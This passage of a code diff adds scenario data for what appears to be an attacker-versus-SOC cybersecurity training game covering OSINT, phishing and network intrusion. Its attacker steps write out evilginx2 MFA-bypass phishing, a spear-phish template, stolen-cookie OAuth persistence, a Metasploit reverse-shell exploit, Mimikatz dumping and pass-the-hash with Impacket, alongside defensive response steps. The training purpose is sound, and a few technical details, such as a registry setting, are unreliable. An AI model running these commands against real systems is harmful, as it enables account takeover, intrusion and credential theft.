+       cmd:"shodan search 'org:\"Acme Corp\"' --fields ip_str,port,product,version",
+       output:["104.21.44.12   443   nginx/1.18.0","104.21.44.12   22    OpenSSH 7.4 (VULNERABLE: CVE-2023-38408)","198.51.100.4   3389  Microsoft RDP","198.51.100.4   8080  Apache Tomcat 9.0.45","[!] OpenSSH 7.4 has known RCE vulnerability","[!] RDP exposed to internet — brute force risk"],
+       desc:"Shodan is a search engine for internet-connected devices. It reveals open ports, software versions, and known CVEs without sending a single packet to the target.",
+       why:"Exposed RDP, outdated SSH, and unpatched Tomcat are easy entry points. This reconnaissance is completely passive — undetectable.",
+       choices:[
+         {t:"shodan search 'org:\"Acme Corp\"' --fields ip_str,port,product,version,vuln",c:true,explain:"Adding the 'vuln' field shows known CVEs directly. Maximum intelligence with zero network noise."},
+         {t:"ping acmecorp.com",c:false,explain:"Ping is active, tells you almost nothing useful, and can be logged. Shodan is passive and infinitely more informative."},
+         {t:"shodan host 104.21.44.12",c:false,explain:"Single host lookup misses all other IPs belonging to the organisation. Org-wide search is more thorough."},
+       ]},
+      {name:"LinkedIn OSINT",tool:"Maltego",
+       cmd:"maltego> run CompanyToPersonTransform(acmecorp.com)\n[mapping org chart from LinkedIn...]",
+       output:["[+] CEO: Robert Chen — ex-Goldman Sachs, MBA Harvard","[+] IT Manager: James Smith — using Cisco ASA, Palo Alto","[+] DevOps: Sarah Lee — GitHub: github.com/sarah-lee-acme","[+] Found public GitHub repo: acme-infra (PUBLIC!)","[!] acme-infra contains: .env file, AWS keys (EXPOSED)","[!] AWS_ACCESS_KEY_ID=AKIA... found in commit history"],
+       desc:"Maltego maps relationships between people, companies, emails and infrastructure. LinkedIn inadvertently reveals technology stack, hierarchy and personal details.",
+       why:"Exposed AWS keys in a public GitHub repo mean instant cloud access. Knowing the IT manager's specific tools enables highly targeted spear-phishing.",
+       choices:[
+         {t:"Search github.com for 'acmecorp' and check all commit history for secrets",c:true,explain:"GitHub secrets scanning is critical. Many major breaches start with exposed API keys in public repositories."},
+         {t:"Call the CEO directly and ask about their security setup",c:false,explain:"Too direct and easily traceable. Passive OSINT leaves no evidence and is far more effective."},
+         {t:"Only check the company website",c:false,explain:"Company websites are carefully sanitised. The real intelligence is on GitHub, LinkedIn, and job postings."},
+       ]},
+      {name:"Attack surface map",tool:"OSINT Framework",
+       cmd:"# Compile all findings\ncat > target_profile.txt << EOF\nEmails: j.smith@acmecorp.com, ceo@acmecorp.com\nVulnerable: OpenSSH 7.4 (CVE-2023-38408), RDP:3389\nExposed: AWS keys in GitHub commit abc123f\nPersonnel: CEO (Robert Chen), IT Mgr (James Smith)\nEOF",
+       output:["[*] Attack vectors identified:","  1. Spear-phish James Smith (IT Mgr) — highest access","  2. Exploit CVE-2023-38408 on SSH server","  3. Use exposed AWS keys for cloud access","  4. Brute-force RDP (198.51.100.4:3389)","[*] Recommended: Start with AWS key abuse — zero noise","[+] Recon phase complete. Moving to weaponisation."],
+       desc:"Attackers compile a full target profile — emails, vulnerabilities, org chart, exposed credentials — to plan the optimal attack path with minimal detection risk.",
+       why:"Methodical attackers always choose the path of least resistance. Exposed cloud credentials beat brute force every time — silent, instant, and hard to detect.",
+       choices:[
+         {t:"Exploit exposed AWS keys first — silent, high-value, minimal detection",c:true,explain:"Correct attacker mindset. Credential abuse generates minimal logs and provides immediate cloud access."},
+         {t:"Launch all attack vectors simultaneously for maximum impact",c:false,explain:"Volume creates noise, and noise creates detection. Sophisticated attackers are methodical and quiet."},
+         {t:"Send phishing email to the CEO first",c:false,explain:"CEOs have heightened security awareness and monitoring. IT staff are higher-value targets with lower detection risk."},
+       ]}
+    ]
+  },
+  soc:{
+    prompt:"analyst@soc:~$",
+    intro:["[*] SOC Console — Acme Corp","[*] Mission: Detect and close OSINT exposure","[*] Tools: Shodan Monitor, GitGuardian, SIEM",""],
+    steps:[
+      {name:"Self-OSINT audit",tool:"Shodan Monitor",
+       cmd:"shodan-monitor --org 'Acme Corp' --alert-on cve,open-ports",
+       output:["[ALERT] 198.51.100.4:3389 — RDP exposed to internet","[ALERT] 104.21.44.12:22 — OpenSSH 7.4 CVE-2023-38408","[ALERT] 104.21.44.12:8080 — Apache Tomcat EOL version","[INFO] Monitoring 12 IP addresses","[ACTION REQUIRED] 3 critical exposures found"],
+       desc:"Run Shodan Monitor against your own organisation to see exactly what attackers see. This is proactive attack surface management.",
+       why:"If an attacker can find your CVEs on Shodan, so can you — before they exploit them. Continuous monitoring catches new exposures as they appear.",
+       choices:[
+         {t:"shodan-monitor --org 'Acme Corp' --severity critical --notify slack",c:true,explain:"Filter to critical CVEs and pipe alerts to Slack for immediate team response. Automation is essential at scale."},
+         {t:"Check the company website for security issues",c:false,explain:"Shodan shows internet-facing services exactly as attackers see them. The website alone is completely insufficient."},
+         {t:"Wait for the annual penetration test results",c:false,explain:"Annual pentests are far too infrequent. Continuous monitoring catches new exposures within hours."},
+       ]},
+      {name:"GitHub secrets scan",tool:"GitGuardian",
+       cmd:"ggshield secret scan repo https://github.com/acme-infra --all-policies",
+       output:["Scanning repository...","[CRITICAL] AWS credentials found","  File: .env (commit abc123f — 3 months ago)","  AWS_ACCESS_KEY_ID: AKIA***","  AWS_SECRET_ACCESS_KEY: ***","[CRITICAL] Private key found in deploy.sh","[WARNING] Internal IP addresses in config.yaml","[ACTION] Rotate credentials IMMEDIATELY"],
+       desc:"GitGuardian scans public and private repositories for accidentally committed secrets — API keys, passwords, and certificates.",
+       why:"Secrets in Git history are permanently visible even after the file is deleted. The credential must be rotated, not just removed from the repo.",
+       choices:[
+         {t:"Immediately rotate AWS keys via IAM AND check CloudTrail for any unauthorised use",c:true,explain:"Correct two-step response: rotate first to stop the bleeding, then investigate to assess damage. Order matters."},
+         {t:"Delete the .env file from GitHub and close the alert",c:false,explain:"Deleting the file doesn't erase Git history. The key is permanently visible and may already be compromised."},
+         {t:"Email the developer to fix it when they have time",c:false,explain:"This is a critical incident, not a code review comment. Immediate rotation, then process improvement."},
+       ]},
+      {name:"Patch critical CVEs",tool:"Vulnerability Scanner",
+       cmd:"apt update && apt upgrade openssh-server -y\nufw deny 3389/tcp\nufw allow from 10.0.0.0/8 to any port 3389",
+       output:["openssh-server (1:8.9p1-3) upgraded","CVE-2023-38408 — PATCHED ✓","Rule updated: deny 3389/tcp from 0.0.0.0/0","Rule updated: allow 3389/tcp from 10.0.0.0/8","[+] RDP now restricted to internal network only","[+] SSH patched. RDP exposure eliminated."],
+       desc:"Patch vulnerable software immediately and restrict unnecessarily exposed services. RDP should never be open to the public internet.",
+       why:"Every day a known CVE remains unpatched is a day an attacker can automate exploitation. Time-to-patch for critical CVEs should be measured in hours.",
+       choices:[
+         {t:"Patch SSH, firewall RDP to internal only, and enforce MFA on all remote access",c:true,explain:"Layered defence: patch the vulnerability, restrict the exposure, and require MFA. No single point of failure."},
+         {t:"Just patch OpenSSH and call it done",c:false,explain:"RDP is still exposed to the internet and Tomcat is still EOL. All attack vectors must be addressed."},
+         {t:"Disable SSH entirely to eliminate the risk",c:false,explain:"Disabling critical services breaks operations. Patch and restrict access instead — security must enable the business."},
+       ]},
+      {name:"Staff OSINT training",tool:"Security Awareness Platform",
+       cmd:"# Audit what employees share publicly\n# Run: 'Digital Footprint Reduction' training module\ncat awareness_audit.txt",
+       output:["[*] LinkedIn Audit:","  23 employees list internal tools publicly","  8 employees have resumes with full org chart","  3 employees have public GitHub repos with work code","[*] Training assigned: Digital Footprint Reduction","[*] Policy updated: GitHub usage policy enforced","[+] Attack surface reduced by ~60%"],
+       desc:"OSINT attacks use information employees unknowingly share publicly. Regular audits and training on digital footprint reduction are essential.",
+       why:"You cannot patch humans, but you can train them. Reducing publicly available information about your organisation meaningfully shrinks the attack surface.",
+       choices:[
+         {t:"Quarterly self-OSINT audits plus mandatory digital footprint training for all staff",c:true,explain:"Continuous awareness combined with scheduled audits. One-time training has under 20% retention after 30 days."},
+         {t:"Ask the IT manager to stop using LinkedIn",c:false,explain:"Blanket bans harm recruitment and team culture. Train staff on what not to share instead."},
+         {t:"Block LinkedIn at the corporate firewall",c:false,explain:"Employees access LinkedIn on personal devices. Network blocks do not solve the information disclosure problem."},
+       ]}
+    ]
+  },
+  lessons:[
+    "Attackers harvest emails, subdomains and employee data using only public sources — zero packets sent to your network.",
+    "Shodan shows your entire internet-facing attack surface including CVEs. Run it against yourself before attackers do.",
+    "Git commit history permanently stores secrets even after deletion. Rotate credentials immediately — don't just delete the file.",
+    "RDP should never be exposed to the internet. Use VPN with MFA for all remote access.",
+    "Time-to-patch for critical CVEs should be hours, not weeks. Automate vulnerability scanning and alerting."
+  ]
+},
+{
+  id:1,name:"Phishing Campaign",icon:"🎣",
+  hackerTools:["GoPhish","evilginx2","SET","Burp Suite"],
+  socTools:["Proofpoint","DMARC Analyzer","Microsoft 365 Defender"],
+  hacker:{
+    prompt:"attacker@kali:~$",
+    intro:["[*] Target: Acme Corp employees","[*] Objective: Steal credentials via phishing","[*] Phase: Delivery / Credential Capture",""],
+    steps:[
+      {name:"Clone login page",tool:"evilginx2",
+       cmd:"evilginx2> phishlets enable microsoft365\nevilginx2> lures create microsoft365\nevilginx2> lures get-url 1",
+       output:["[*] Phishlet 'microsoft365' enabled","[*] Proxying: login.microsoft.com → attacker server","[*] SSL cert auto-generated: acmecorp-secure-login.com","[+] Lure URL: https://acmecorp-secure-login.com/v2/auth","[*] Capturing: username, password, session cookies","[!] Bypasses MFA by capturing session token directly"],
+       desc:"evilginx2 is a man-in-the-middle phishing framework. It proxies the real login page and steals session cookies — bypassing MFA entirely.",
+       why:"Modern phishing defeats MFA. By sitting between the user and the real site, attackers steal the post-authentication session token without knowing the MFA code.",
+       choices:[
+         {t:"evilginx2> phishlets enable microsoft365 --redirect-url https://acmecorp.com",c:true,explain:"Redirecting to the real site after credential capture prevents suspicion. Users believe the login succeeded normally."},
+         {t:"Build a static HTML login page manually",c:false,explain:"Static pages are trivially detected by email gateways. Reverse proxies bypass more defences and capture MFA session tokens."},
+         {t:"Send phishing links via SMS instead of email",c:false,explain:"Email phishing reaches corporate inboxes more reliably. SMS is supplementary, not a primary delivery vector."},
+       ]},
+      {name:"Craft spear-phish email",tool:"Social Engineer Toolkit",
+       cmd:"# Craft targeted email as IT Security Team\n# Subject: URGENT — suspicious login detected\n# Reference: IT Manager James Smith's name",
+       output:["From: security-alert@acmecorp-it.com","To: j.smith@acmecorp.com","Subject: ⚠️ Suspicious login from Russia — verify now","---","Hi James, our system detected a login attempt","from Moscow, Russia at 03:42 AM. Verify your","identity within 2 hours to prevent suspension.","[Verify My Account] → acmecorp-secure-login.com","---","[*] Email sent. Tracking pixel embedded."],
+       desc:"Spear-phishing uses personal details gathered from OSINT to craft targeted, believable emails. Urgency and fear override rational decision-making.",
+       why:"Generic phishing achieves a ~3% click rate. Spear-phishing with personal context reaches 30–40%. The OSINT phase directly enables this.",
+       choices:[
+         {t:"Send from acmecorp-it.com domain with accurate branding and the real IT manager's name",c:true,explain:"Domain spoofing plus personal context equals high credibility. Use everything gathered in the OSINT phase."},
+         {t:"Send from a free Gmail address to save setup time",c:false,explain:"Free email domains are flagged immediately by every corporate email gateway. Invest in a convincing domain."},
+         {t:"Send to all 500 staff simultaneously for maximum reach",c:false,explain:"Mass campaigns trigger anomaly detection. Targeted spear-phishing to a small group is far less detectable and more effective."},
+       ]},
+      {name:"Capture credentials",tool:"evilginx2",
+       cmd:"evilginx2> sessions\n\n=== LIVE CAPTURES ===",
+       output:["[+] j.smith@acmecorp.com — CAPTURED","    Password: S3cur3Pass#2024","    Session Cookie: .AspNet.Cookies=eyJhb...","    MFA status: BYPASSED (token captured)","[+] s.lee@acmecorp.com — CAPTURED","[*] GoPhish: 9 of 47 recipients clicked (19%)","[*] 2 sets of credentials with live sessions captured"],
+       desc:"The reverse proxy captures credentials in real time AND the post-MFA session cookie — enabling immediate account takeover without knowing the MFA code.",
+       why:"This is why MFA alone is insufficient against modern phishing. Session token theft bypasses it completely. FIDO2 hardware keys are the only reliable defence.",
+       choices:[
+         {t:"Import j.smith's session cookie immediately before it expires",c:true,explain:"Session cookies expire quickly. Use them within minutes. Import via browser extension for immediate account access."},
+         {t:"Log in using the username and password",c:false,explain:"MFA is enabled — credentials alone will not work. The session cookie bypasses MFA entirely."},
+         {t:"Wait to collect more credentials before acting",c:false,explain:"Session cookies have short expiry times. Delay means lost access. Act on captured sessions immediately."},
+       ]},
+      {name:"Establish persistence",tool:"Microsoft Graph API",
+       cmd:"# Register rogue OAuth app using stolen session\ncurl -H 'Cookie: .AspNet.Cookies=eyJhb...' \\\n  'https://graph.microsoft.com/v1.0/me/oauth2PermissionGrants' \\\n  -d '{\"scope\":\"Mail.ReadWrite,Files.ReadWrite.All\"}'",
+       output:["[+] OAuth app registered: 'Acme Backup Tool'","[+] Permissions granted: Mail.ReadWrite, Files.ReadWrite","[+] Refresh token obtained — no MFA required for future access","[*] Persistent mail and file access established","[!] Survives password resets","[!] Appears legitimate in OAuth consents list"],
+       desc:"After initial access, attackers register rogue OAuth applications in Microsoft 365 to maintain persistent access via refresh tokens — surviving password resets.",
+       why:"OAuth persistence is extremely difficult to detect. Even after a victim changes their password, the attacker's application token remains valid until manually revoked.",
+       choices:[
+         {t:"Register the OAuth app with minimal permissions to avoid triggering anomaly detection",c:true,explain:"Blend in with legitimate applications. Minimal permissions reduce the chance of detection. Persistence over speed."},
+         {t:"Continue using the session cookie indefinitely",c:false,explain:"Session cookies expire within hours. OAuth refresh tokens last months. Always establish persistent access."},
+         {t:"Download all emails at once and immediately exit",c:false,explain:"Large bulk downloads trigger DLP alerts. Quiet persistent access is far more valuable than a noisy smash-and-grab."},
+       ]}
+    ]
+  },
+  soc:{
+    prompt:"analyst@soc:~$",
+    intro:["[*] SOC Alert: Suspicious login activity detected","[*] Mission: Detect phishing, contain breach, remediate","[*] Tools: Proofpoint, SIEM, Microsoft 365 Defender",""],
+    steps:[
+      {name:"Email gateway analysis",tool:"Proofpoint",
+       cmd:"m365-defender> email-threats --last 24h --severity high\nproofpoint> search --domain acmecorp-secure-login.com",
+       output:["[ALERT] 9 users clicked: acmecorp-secure-login.com","[ALERT] Domain registered 6 hours ago (SUSPICIOUS)","[ALERT] Sender: security-alert@acmecorp-it.com","  SPF: FAIL | DKIM: FAIL | DMARC: FAIL","[ALERT] Lookalike domain: acmecorp-it.com ≠ acmecorp.com","[ACTION] Email quarantined for 47 recipients","[URGENT] 9 users already clicked before quarantine"],
+       desc:"Email gateways analyse SPF, DKIM, and DMARC authentication records and detect lookalike domains. Failed authentication is a primary indicator of phishing.",
+       why:"If DMARC is enforced with a reject policy, spoofed emails never reach user inboxes. Most organisations run DMARC in monitor mode only — a critical gap.",
+       choices:[
+         {t:"Quarantine all emails from sender domain and block the phishing domain at the proxy",c:true,explain:"Stop the bleeding first. Block and quarantine prevents further clicks. Then investigate the 9 who already clicked."},
+         {t:"Send a warning email to all staff about the phishing campaign",c:false,explain:"Warning emails cause panic and ironically generate more clicks from curious staff. Quietly contain first."},
+         {t:"Wait to see if more staff report it before acting",c:false,explain:"Every minute of delay means more credential captures. Immediate automated response is essential."},
+       ]},
+      {name:"Compromised account triage",tool:"Microsoft 365 Defender",
+       cmd:"m365-defender> compromised-accounts --indicator acmecorp-secure-login.com\nm365-defender> sign-in-logs --user j.smith --last 2h",
+       output:["[COMPROMISED] j.smith@acmecorp.com","  Login from: 185.220.101.x (Tor exit node)","  Time: 14 minutes after phish click","  MFA: Completed (session token bypass)","  Actions: Mail read, OAuth app registered","[COMPROMISED] s.lee@acmecorp.com","  Login from: 194.165.16.x (VPN)","[URGENT] Rogue OAuth app detected: 'Acme Backup Tool'"],
+       desc:"Sign-in logs reveal logins from Tor or VPN exit nodes immediately after phishing clicks — clear and high-confidence indicators of compromise.",
+       why:"Impossible travel and Tor exit node logins are high-fidelity signals. Conditional Access policies should automatically block logins from these sources.",
+       choices:[
+         {t:"Revoke all sessions, reset passwords, and remove the rogue OAuth app for both accounts",c:true,explain:"Correct incident response sequence: revoke all sessions first, then remove the OAuth app for persistent access, then reset credentials."},
+         {t:"Just reset James Smith's password",c:false,explain:"Password reset does not invalidate active sessions or OAuth tokens. All tokens must be explicitly revoked."},
+         {t:"Monitor the attacker's activity to gather more intelligence before acting",c:false,explain:"The attacker has live access to sensitive email and files. Contain the breach immediately — intelligence gathering comes after."},
+       ]},
+      {name:"Enforce DMARC and MFA",tool:"DMARC Analyzer",
+       cmd:"# Upgrade DMARC from monitor to reject policy\n# Enable FIDO2 phishing-resistant MFA\naz ad policy --set fido2-required --users privileged",
+       output:["[*] Current DMARC: v=DMARC1; p=none (monitor only)","[*] Updating to: v=DMARC1; p=reject","[+] DMARC reject policy active — spoofed emails blocked","[*] Updating MFA: SMS/Authenticator → FIDO2 hardware keys","[+] evilginx2-style session token theft defeated","[+] Phishing-resistant MFA active for all privileged users"],
+       desc:"DMARC reject policy stops domain spoofing. FIDO2 hardware keys are phishing-resistant — the session token cannot be stolen because authentication happens on the physical device.",
+       why:"DMARC reject plus FIDO2 defeats the vast majority of phishing attacks. Yet most organisations run DMARC in monitor mode and use SMS-based MFA.",
+       choices:[
+         {t:"DMARC p=reject, FIDO2 for privileged accounts, and Conditional Access blocking Tor and VPN logins",c:true,explain:"Layered defence that stops this exact attack at three different points. Each layer addresses a specific technique used."},
+         {t:"Enforce DMARC reject only",c:false,explain:"DMARC stops domain spoofing but evilginx2 uses lookalike domains, not spoofed domains. FIDO2 is also required."},
+         {t:"Switch to SMS-based MFA as an upgrade from the current setup",c:false,explain:"SMS MFA is vulnerable to SIM swapping and is defeated by evilginx2. FIDO2 hardware keys are the only phishing-resistant option."},
+       ]},
+      {name:"Hunt OAuth persistence",tool:"Microsoft 365 Defender",
+       cmd:"m365-defender> oauth-apps --consent-type user --created-last 30d\nm365-defender> oauth-apps --permission Mail.ReadWrite",
+       output:["[SUSPICIOUS] 'Acme Backup Tool' — created today","  Publisher: unverified","  Permissions: Mail.ReadWrite, Files.ReadWrite.All","  Consented by: j.smith, s.lee","[ACTION] App revoked and blocked","[*] Full 30-day scan: 3 additional suspicious apps found","[+] All rogue OAuth applications removed"],
+       desc:"OAuth application abuse is a common post-phishing persistence mechanism. Regular audits of consented applications find attacker backdoors that survive password resets.",
+       why:"A rogue OAuth app with mail access can silently exfiltrate data for months. These backdoors survive password resets and are often overlooked during incident response.",
+       choices:[
+         {t:"Revoke all unverified OAuth apps, require admin consent for future installs, and audit monthly",c:true,explain:"Full remediation plus prevention. Admin consent gates stop users from self-installing rogue applications in future."},
+         {t:"Remove only the specific app that was just discovered",c:false,explain:"The attacker may have registered multiple applications. A complete audit of all OAuth consents is required."},
+         {t:"Disable all OAuth applications in the tenant",c:false,explain:"OAuth powers legitimate business tools like Slack, Zoom, and Salesforce. Blanket disabling would break critical operations."},
+       ]}
+    ]
+  },
+  lessons:[
+    "evilginx2-style reverse proxy phishing bypasses MFA by stealing session tokens. FIDO2 hardware keys are the only reliable defence.",
+    "DMARC p=reject stops domain spoofing. Most organisations run p=none (monitor only) — this is a significant security gap.",
+    "OAuth application persistence survives password resets. Audit consented apps quarterly and require admin approval for new installs.",
+    "Spear-phishing click rates reach 30–40% compared to 3% for generic phishing. OSINT makes attacks highly personal and convincing.",
+    "Session revocation (not just password reset) is critical. Active tokens must be explicitly invalidated to fully contain a breach."
+  ]
+},
+{
+  id:2,name:"Network Intrusion",icon:"🌐",
+  hackerTools:["nmap","Metasploit","Mimikatz","Impacket"],
+  socTools:["Wireshark","Suricata IDS","CrowdStrike EDR","Splunk"],
+  hacker:{
+    prompt:"attacker@kali:~$",
+    intro:["[*] Initial access obtained via phishing","[*] Objective: Lateral movement across the network","[*] Phase: Post-exploitation",""],
+    steps:[
+      {name:"Network discovery",tool:"nmap",
+       cmd:"nmap -sn 10.0.1.0/24 | grep 'Up'\nnmap -sV -sC -p- --open 10.0.1.0/24 --min-rate 1000",
+       output:["10.0.1.1   — Router (Cisco IOS)","10.0.1.10  — Windows Server 2019 (Domain Controller)","10.0.1.20  — SQL Server 2019 (port 1433 open)","10.0.1.50  — File Server (SMB 445 open)","10.0.1.100 — Apache 2.4.49 (CVE-2021-41773!)","[!] CRITICAL: Path traversal RCE on web server","[!] Domain Controller identified — primary target"],
+       desc:"nmap maps the entire network topology. -sV detects service versions, -sC runs default scripts. Finding the DC and an RCE vulnerability defines the attack path.",
+       why:"Network discovery reveals the blast radius. The Domain Controller is the highest-value target. CVE-2021-41773 provides unauthenticated code execution.",
+       choices:[
+         {t:"nmap -sV -O -sC --script vuln 10.0.1.0/24 -oA full_scan",c:true,explain:"--script vuln runs vulnerability detection scripts. -O detects the OS. -oA saves all output formats for reference later."},
+         {t:"nmap 10.0.1.1",c:false,explain:"Scanning only the router misses all other hosts. A full subnet sweep is required to map the complete attack surface."},
+         {t:"nmap -sS 10.0.1.10 -p 80,443",c:false,explain:"Checking only web ports on one host misses SQL, SMB, RDP, and other critical lateral movement vectors."},
+       ]},
+      {name:"Exploit web server",tool:"Metasploit",
+       cmd:"msfconsole> use exploit/multi/http/apache_normalize_path_rce\nset RHOSTS 10.0.1.100\nset LHOST 10.0.1.55\nrun",
+       output:["[*] Started reverse TCP handler on 10.0.1.55:4444","[*] Sending exploit payload...","[+] CVE-2021-41773 triggered","[+] Meterpreter session 1 opened","meterpreter > getuid","Server username: www-data","meterpreter > sysinfo","OS: Ubuntu 20.04 / x86_64"],
+       desc:"Metasploit automates exploitation of known CVEs. CVE-2021-41773 allows unauthenticated remote code execution on Apache 2.4.49 via path traversal.",
+       why:"Unpatched CVEs with public exploits are the easiest attack path. This exploit was weaponised within 24 hours of its public disclosure.",
+       choices:[
+         {t:"post/multi/recon/local_exploit_suggester then upload a persistent backdoor",c:true,explain:"Local exploit suggester finds privilege escalation paths. Persistence ensures continued access if the server reboots."},
+         {t:"Download all files from the web server immediately",c:false,explain:"Bulk transfers trigger DLP and SIEM alerts. Establish persistence first, exfiltrate carefully later."},
+         {t:"Run the exploit against all discovered hosts simultaneously",c:false,explain:"Simultaneous exploitation generates significant network noise. One host at a time, low and slow."},
+       ]},
+      {name:"Credential dumping",tool:"Mimikatz",
+       cmd:"meterpreter> load kiwi\nmeterpreter> creds_all",
+       output:["[*] Loading kiwi extension...","[+] msv credentials:","  svc_backup   NTLM: aad3b435:31d6cfe0...","  admin_james  NTLM: aad3b435:8f49412c...","[+] wdigest credentials:","  svc_sql   Password: Sql@Acme2024!","[!] svc_backup likely has domain-level access"],
+       desc:"Mimikatz dumps credentials from Windows LSASS memory. Service accounts frequently have excessive privileges and generate very few monitoring alerts.",
+       why:"Service accounts are often overlooked: no MFA, frequently over-privileged, and rarely monitored. They are a primary path to domain compromise.",
+       choices:[
+         {t:"Use svc_backup NTLM hash in a pass-the-hash attack against the Domain Controller",c:true,explain:"Pass-the-hash uses the hash directly without cracking it. Service accounts frequently have Domain Controller access."},
+         {t:"Try to crack the NTLM hash with hashcat before using it",c:false,explain:"Cracking takes time and compute resources. Pass-the-hash uses the hash directly — no cracking needed."},
+         {t:"Use the SQL password to access the database only",c:false,explain:"Database access is useful, but the Domain Controller is the real target. svc_backup credentials reach further."},
+       ]},
+      {name:"Domain controller compromise",tool:"Impacket",
+       cmd:"impacket-psexec -hashes aad3b435:31d6cfe0 svc_backup@10.0.1.10\nsecretsdump.py -just-dc-user krbtgt acmecorp/svc_backup@10.0.1.10",
+       output:["[*] Authenticating via NTLM pass-the-hash...","[+] Shell obtained on Domain Controller","[*] Dumping NTDS.dit (Active Directory database)...","[+] krbtgt hash extracted: 819df0b3....","[!] Golden Ticket attack now possible","[!] Entire domain compromised","[+] All 847 domain user hashes dumped"],
+       desc:"With the krbtgt hash an attacker can forge Kerberos Golden Tickets for any user indefinitely — surviving multiple password resets.",
+       why:"Golden Ticket attacks persist even after the krbtgt password is changed once. Microsoft requires two rotations to fully invalidate all forged tickets.",
+       choices:[
+         {t:"Forge a Golden Ticket for Domain Admin with a 10-year lifetime",c:true,explain:"Golden Tickets default to a 10-year lifetime. The attacker effectively owns the domain permanently until krbtgt is rotated twice."},
+         {t:"Exfiltrate all data immediately and exit the network",c:false,explain:"Large-scale exfiltration triggers immediate alerts. Establish quiet persistent access first."},
+         {t:"Create a new privileged administrator account",c:false,explain:"New privileged accounts trigger account creation alerts in any competent SIEM. Golden Tickets blend with legitimate traffic."},
+       ]}
+    ]
+  },
+  soc:{
+    prompt:"analyst@soc:~$",
+    intro:["[*] SIEM Alert: Anomalous internal traffic detected","[*] Mission: Detect lateral movement and contain the breach","[*] Tools: Suricata IDS, CrowdStrike EDR, Splunk SIEM",""],
+    steps:[
+      {name:"SIEM alert triage",tool:"Splunk",
+       cmd:"splunk search 'index=network sourcetype=suricata alert.severity=1 earliest=-1h'\n| stats count by src_ip dest_ip alert.signature",
+       output:["SRC          DEST          SIGNATURE              COUNT","10.0.1.100   10.0.1.55    ET SCAN nmap SYN Scan      847","10.0.1.55    10.0.1.100   Apache Path Traversal       3","10.0.1.100   10.0.1.55    Reverse Shell Connection    1","10.0.1.100   10.0.1.10    SMB Admin Share Access     12","[CRITICAL] Lateral movement pattern detected","[CRITICAL] Web server appears compromised"],
+       desc:"SIEM correlates alerts across all data sources. The sequence — scan, exploit, reverse shell, lateral movement — tells the complete attack story in chronological order.",
+       why:"Individual alerts are noise. Correlation reveals the attack chain. A SIEM is only effective if it has well-tuned detection rules and is reviewed regularly.",
+       choices:[
+         {t:"Isolate 10.0.1.100 from the network immediately and start forensic packet capture",c:true,explain:"Contain the beachhead before the attacker moves further. Network isolation plus forensics preserves evidence for investigation."},
+         {t:"Block the scanning IP and close the alert",c:false,explain:"The scan source may be attacker-controlled, but 10.0.1.100 is already compromised and communicating with the DC. Isolate it."},
+         {t:"Wait for additional alerts to confirm the pattern before acting",c:false,explain:"The attack chain is already clear. Every minute of delay gives the attacker more time to reach the Domain Controller."},
+       ]},
+      {name:"EDR investigation",tool:"CrowdStrike Falcon",
+       cmd:"falcon-edr --host 10.0.1.100 --process-tree --last 2h\nfalcon-edr --host 10.0.1.100 --memory-scan --detect mimikatz",
+       output:["PROCESS TREE (10.0.1.100):","  httpd (PID 1204)","  └─ bash (PID 3891) ← SUSPICIOUS: spawned by web server","     └─ python3 reverse shell ← ACTIVE","        └─ meterpreter session active","           └─ kiwi extension loaded","[CRITICAL] Credential dumping activity detected","[CRITICAL] LSASS memory read attempt — partially blocked","[+] Mimikatz signature quarantined"],
+       desc:"EDR tools track every process, file write, and network connection. Process trees reveal the exact exploitation chain from initial access to credential dumping.",
+       why:"EDR is the single most effective tool against post-exploitation activity. It catches what firewalls and network-based SIEMs miss at the endpoint level.",
+       choices:[
+         {t:"Kill the meterpreter session, isolate the host, and hunt laterally for movement indicators",c:true,explain:"Terminate the active session, contain the host, then hunt across the network. The attacker may have already reached other systems."},
+         {t:"Restart the web server to clear the malware",c:false,explain:"Restarting destroys volatile memory evidence needed for forensic investigation. The attacker may also have persistence surviving reboots."},
+         {t:"Quarantine the Mimikatz file only",c:false,explain:"Quarantining one file leaves the active meterpreter session running. The attacker still has a live shell and full access."},
+       ]},
+      {name:"Patch and harden",tool:"Patch Management",
+       cmd:"apt install apache2=2.4.51-1 -y\nreg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA' /v PPLMask /t REG_DWORD /d 1",
+       output:["Apache 2.4.49 → 2.4.51 patched","CVE-2021-41773 — REMEDIATED ✓","CVE-2021-42013 — REMEDIATED ✓","[*] Enabling Windows Credential Guard...","[+] LSASS now runs as Protected Process Light","[+] Mimikatz wdigest extraction blocked","[+] svc_backup removed from Domain Admins group"],
+       desc:"Patch the exploited CVE and enable Credential Guard to protect LSASS from credential dumping. Remove excessive service account privileges.",
+       why:"Credential Guard puts LSASS in a secure virtualised container that Mimikatz cannot read from. This defence is free on Windows 10 and Server 2016 and above.",
+       choices:[
+         {t:"Patch Apache, enable Credential Guard, reset krbtgt password twice, audit service account privileges",c:true,explain:"Complete remediation. Patching stops re-exploitation. Credential Guard stops future dumping. Double krbtgt rotation kills any forged Golden Tickets."},
+         {t:"Just patch Apache — that was the entry point",c:false,explain:"The entry point is patched but credentials are already compromised. krbtgt and service account passwords must be rotated."},
+         {t:"Enable Credential Guard only",c:false,explain:"Credential Guard helps against future attacks but does not address the current compromise. Patch and credential rotation are also required."},
+       ]},
+      {name:"Golden Ticket hunt",tool:"Microsoft Defender for Identity",
+       cmd:"mdi> threat-detections --type golden-ticket --last 7d\nmdi> kerberos-anomalies --account krbtgt",
+       output:["[DETECTION] Golden Ticket activity suspected","  Ticket lifetime: 10 years (anomalous — default is 10 hours)","  Source IP: 10.0.1.55 (not domain-joined)","  Time: 2 hours after initial web server compromise","[ACTION] krbtgt password must be rotated TWICE","Pass 1: krbtgt password rotated","Pass 2: krbtgt password rotated (all forged tickets now invalid)","[+] Domain fully remediated"],
+       desc:"Microsoft Defender for Identity detects abnormal Kerberos ticket lifetimes and pass-the-hash activity. Golden Ticket invalidation requires two krbtgt password rotations.",
+       why:"A single rotation is insufficient — existing tickets remain valid. Two rotations within the ticket lifetime period fully invalidates all forged Kerberos tickets.",
+       choices:[
+         {t:"Reset krbtgt password twice within 10 hours, force domain-wide re-authentication, and audit DC event logs",c:true,explain:"The only correct Golden Ticket remediation. Two rotations within the ticket lifetime completely invalidates all forged tickets."},
+         {t:"Reset krbtgt password once and monitor for further activity",c:false,explain:"Single rotation leaves existing Golden Tickets valid. Must rotate twice within the ticket lifetime period."},
+         {t:"Disable the svc_backup account and reset all user passwords",c:false,explain:"Necessary steps, but insufficient on their own. krbtgt must be rotated twice specifically to invalidate Golden Tickets."},
+       ]}
+    ]
+  },
+  lessons:[
